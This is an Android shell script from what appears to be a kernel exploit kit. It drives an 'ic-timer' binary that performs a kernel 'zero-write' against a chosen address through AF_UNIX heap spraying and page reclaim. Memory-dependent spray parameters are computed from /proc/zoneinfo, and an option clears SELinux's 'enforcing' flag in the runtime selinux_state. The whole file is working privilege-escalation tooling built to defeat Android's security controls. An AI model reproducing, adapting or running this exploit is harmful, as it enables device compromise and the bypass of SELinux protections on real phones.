#!/system/bin/sh
# zero.sh <name> <target> [selinux]
#
# One full zero-write attempt with the AF_UNIX 8K-frag reclaim.  On success
# the exploit prints "[zero] target=..." and parks forever (it holds the
# reclaimed page); the caller watches zero-<name>.log and must never kill it.
#
# selinux=1 means <target> is the runtime selinux_state address: the exploit
# shifts it to state-7 itself and only `enforcing` is cleared.  Never pass an
# unadjusted state with selinux=0 -- that clears `initialized` and unlabels
# /data (2026-10-29 incident).
trap '' HUP INT TERM
D=${KIT_DIR:-/data/local/tmp/ic-kit}
BIN="$D/ic-timer"
NAME=$1
T=$2
SEL=${3:-0}
[ -n "$NAME" ] && [ -n "$T" ] || { echo "[zero] usage: zero.sh name target [selinux]"; exit 1; }
LOG="$D/zero-$NAME.log"
: > "$LOG"

# Zero-write budget scales with the per-CPU pageset high (memory size).
PCP_HIGH=$(awk '/high:/{if ($2+0 > m) m=$2+0} END{print m+0}' /proc/zoneinfo 2>/dev/null)
case "$PCP_HIGH" in ''|*[!0-9]*) PCP_HIGH=3093 ;; esac
if [ "$PCP_HIGH" -lt 512 ] || [ "$PCP_HIGH" -gt 100000 ]; then PCP_HIGH=3093; fi
Z_SCALE=$((PCP_HIGH * 100 / 3093))
[ "$Z_SCALE" -lt 100 ] && Z_SCALE=100
# Pad pool stays 4200 (135*31+15), leaving the 16 free slots the chain
# needs in X's slab; a larger pool changes the layout and stops the early
# discard.
Z_PAD_POOL=4200
Z_PAD_KEEP=4185
Z_SAFE_FILL=$((4000 * Z_SCALE / 100))
Z_LATE_FILL=$((2000 * Z_SCALE / 100))
Z_EARLY_PRIME=$((1024 * Z_SCALE / 100))
Z_EARLY_SLACK=$((512 * Z_SCALE / 100))
[ "$Z_EARLY_SLACK" -gt 2047 ] && Z_EARLY_SLACK=2047
Z_EARLY_WAIT_MS=$((5000 * Z_SCALE / 100))
ZERO_ATTEMPTS_DEF=6
ZERO_EARLY="IC_EARLY_WAIT=1 IC_EARLY_GATE=1"
echo "[zero] budget pcp_high=$PCP_HIGH scale=${Z_SCALE}% pad_pool=$Z_PAD_POOL pad_keep=$Z_PAD_KEEP fill=$Z_SAFE_FILL prime=$Z_EARLY_PRIME slack=$Z_EARLY_SLACK wait_ms=$Z_EARLY_WAIT_MS"

exec env PATH=/sbin:/system/bin:/system/xbin \
    IC_PEAK=1 \
    IC_FORK=1 \
    IC_REVERSE=1 \
    IC_PC=0 \
    IC_PEAK_SKBF=1 \
    IC_KEEP_POOL=1 \
    IC_SKB_MIN=8 \
    IC_AIO_NOFAULT=1 \
    IC_AIO_NOREMAP=1 \
    IC_ANON_PAGES=0 \
    IC_AIO_EVENTS=1 \
    IC_VMA_KEEP=10 \
    IC_AIO_CTXS=16384 \
    IC_VMA_PREWARM=16384 \
    IC_STAGING_DIR="$D/ic-stage" \
    IC_FILP_SHIELD=18000 \
    IC_KM64_SHIELD=4096 \
    IC_ATTEMPT_WAIT=900 \
    IC_ATTEMPTS="${ZERO_ATTEMPTS:-$ZERO_ATTEMPTS_DEF}" \
    IC_SAFE_FILL="$Z_SAFE_FILL" \
    IC_LATE_FILL="$Z_LATE_FILL" \
    IC_SLABTRACE=1 \
    IC_PAD_ALIGN=1 \
    IC_PAD_POOL="$Z_PAD_POOL" \
    IC_PAD_KEEP="$Z_PAD_KEEP" \
    IC_FLUSH_SPARSE=15 \
    IC_SPRAY_EARLY=1 \
    IC_EARLY_PRIME="$Z_EARLY_PRIME" \
    IC_EARLY_SLACK="$Z_EARLY_SLACK" \
    IC_EARLY_WAIT_MS="$Z_EARLY_WAIT_MS" \
    $ZERO_EARLY \
    IC_SKB_SOCKS=8 \
    IC_SPRAY=unixstr \
    IC_UNXSTR_MSGS=8192 \
    IC_ZERO_TARGET="$T" \
    IC_ZERO_SELINUX="$SEL" \
    "$BIN" >> "$LOG" 2>&1
